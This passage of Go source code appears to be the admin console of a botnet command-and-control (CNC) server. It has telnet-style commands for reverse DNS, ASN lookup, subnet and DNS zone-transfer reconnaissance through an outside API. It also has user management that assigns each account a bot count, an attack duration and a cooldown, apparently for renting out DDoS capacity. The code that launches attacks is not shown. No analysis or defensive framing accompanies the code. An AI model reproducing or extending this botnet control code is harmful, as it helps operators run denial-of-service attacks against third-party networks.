				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address/Host Name Only!\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/reversedns" || cmd == "/REVERSEDNS" {
			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/asnlookup" || cmd == "/ASNLOOKUP" {
			this.conn.Write([]byte("\033[01;37mIPv4 or ASN\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
			this.conn.Write([]byte("\033[01;37mCIDR or IP w/ Netmask\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
			this.conn.Write([]byte("\033[01;37mURL (without www.)\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}
	}
}

func (this *Admin) handleAddUser(isAdmin bool) {
	this.conn.Write([]byte("\033[01;37mUsername:\033[01;36m \033[1;33m"))
	new_un, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\033[01;37mPassword:\033[01;36m \033[1;33m"))
	new_pw, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte("\033[01;37mBotcount (-1 for All):\033[01;36m \033[1;33m"))
	max_bots_str, err := this.ReadLine(false)
	if err != nil {
		return
	}
	max_bots, err := strconv.Atoi(max_bots_str)
	if err != nil {
		this.conn.Write([]byte("\033[01;31mInvalid bot count\033[01;37m\r\n"))
		return
	}
	this.conn.Write([]byte("\033[01;37mAttack Duration (-1 for Unlimited):\033[01;36m \033[1;33m"))
	duration_str, err := this.ReadLine(false)
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(duration_str)
	if err != nil {
		this.conn.Write([]byte("\033[01;31mInvalid duration\033[01;37m\r\n"))
		return
	}
	this.conn.Write([]byte("\033[01;37mCooldown (0 for No Cooldown):\033[01;36m \033[1;33m"))
	cooldown_str, err := this.ReadLine(false)
	if err != nil {
		return
	}
	cooldown, err := strconv.Atoi(cooldown_str)
	if err != nil {
		this.conn.Write([]byte("\033[01;31mInvalid cooldown\033[01;37m\r\n"))
		return
	}

	var success bool
	if isAdmin {
		success = database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown)
	} else {
		success = database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown)
	}

	if success {
		this.conn.Write([]byte("\033[01;32mUser created successfully!\033[01;37m\r\n"))
	} else {
		this.conn.Write([]byte("\033[01;31mFailed to create user (may already exist)\033[01;37m\r\n"))
	}
}

func (this *Admin) handleRemoveUser() {
	this.conn.Write([]byte("\033[01;37mUsername to remove:\033[01;36m \033[1;33m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if database.RemoveUser(username) {
		this.conn.Write([]byte("\033[01;32mUser removed\033[01;37m\r\n"))
	} else {
		this.conn.Write([]byte("\033[01;31mUser not found\033[01;37m\r\n"))
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1000)
	bufPos := 0
	for {
		if len(buf) < bufPos+2 {
			fmt.Println("\x1b[1;37mOver Exceded Buf:", len(buf))
			fmt.Println("\x1b[1;37mPrevented CNC Crash | IP:", this.conn.RemoteAddr())
			return string(buf), nil
		}
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
}
